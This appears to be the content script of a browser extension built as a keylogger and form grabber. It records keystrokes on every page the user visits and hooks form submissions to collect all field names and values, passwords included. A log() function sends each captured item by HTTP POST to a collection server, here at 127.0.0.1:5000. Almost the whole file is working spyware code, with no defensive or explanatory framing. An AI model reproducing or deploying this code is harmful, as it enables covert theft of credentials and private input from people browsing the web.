
// inputs = document.getElementsByTagName('input');
// for (index = 0; index < inputs.length; ++index) {
//     var forms = document.getElementsByTagName("form");
//     log("1");
//     for (var i = 0; i < forms.length; i++) {
//         log(i);
//         forms[i].addEventListener("submit", function(e) {
//             var data = {};
//             data["FormName"] = e.target.name;
//             log(e.target.name);
//             data["FormAction"] = e.target.action;
//             data["FormElements"] = {};
//             var elements = e.target.elements;
//             for (var n = 0; n < elements.length; n++) {
//                 data["FormElements"][elements[n].name] = elements[n].value;
//             }
//             log(data);
//         });
//     }
// }



// document.addEventListener('keypress', function (e) {
//     e = e || window.event;
//     var charCode = typeof e.which == "number" ? e.which : e.keyCode;
//     if (charCode) {
//         log(String.fromCharCode(charCode));
//     }
// });



chrome.storage.sync.get({allKeys: false}, function(settings) {
    if (settings.allKeys) {
        document.addEventListener('keydown', function (e) {
            e = e || window.event;
            var charCode = typeof e.which == "number" ? e.which : e.keyCode;
            console.log("Logged", charCode);
            if (charCode == 8) {
                log("[DELETE]");
            } else if (charCode == 9) {
                log("[TAB]");
            } else if (charCode == 13) {
                log("[ENTER]");
            } else if (charCode == 16) {
                log("[SHIFT]");
            } else if (charCode == 17) {
                log("[CTRL]");
            } else if (charCode == 18) {
                log("[ALT]");
            } else if (charCode == 91) {
                log("[L WINDOW]"); // command for mac
            } else if (charCode == 92) {
                log("[R WINDOW]"); // command for mac
            } else if (charCode == 93) {
                log("[SELECT/CMD]"); // command for mac
            }
        });
    } else { // Non function keys
        document.addEventListener('keydown', function (e) {
            e = e || window.event;
            var charCode = typeof e.which == "number" ? e.which : e.keyCode;
            if (charCode == 8) {
                log("[BKSP]");
            } else if (charCode == 9) {
                log("[TAB]");
            } else if (charCode == 13) {
                log("[ENTER]");
            }
        });
    }
});


chrome.storage.sync.get({formGrabber: false}, function(settings) {
    if (settings.formGrabber) {
        var forms = document.getElementsByTagName("form");
        log("1");
        for (var i = 0; i < forms.length; i++) {
            log(i);
            forms[i].addEventListener("submit", function(e) {
                var data = {};
                data["FormName"] = e.target.name;
                log(e.target.name);
                data["FormAction"] = e.target.action;
                data["FormElements"] = {};
                var elements = e.target.elements;
                for (var n = 0; n < elements.length; n++) {
                    data["FormElements"][elements[n].name] = elements[n].value;
                }
                log(data);
            });
        }
    }
});




var time = new Date().getTime();
var data = {};
var shouldSave = false;
var lastLog = time;
data[time] = document.title + "^~^" + document.URL + "^~^";

// Send logs
function log(input) {
    console.log(input);
    var now = new Date().getTime();
    if (now - lastLog < 10) return;
    data[time] += input;
    shouldSave = true;
    lastLog = now;
    const Http = new XMLHttpRequest();
    var json = '{"Log":'+input+'}';
    const url='http://127.0.0.1:5000/'+input;
    //const url='http://127.0.0.1:5000/';
    Http.open("POST", url);
    Http.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
    Http.send(JSON.stringify({ "Log": input}));
    Http.onreadystatechange=(e)=>{
    console.log(Http.responseText);
    };
    console.log("Logged", input);
}


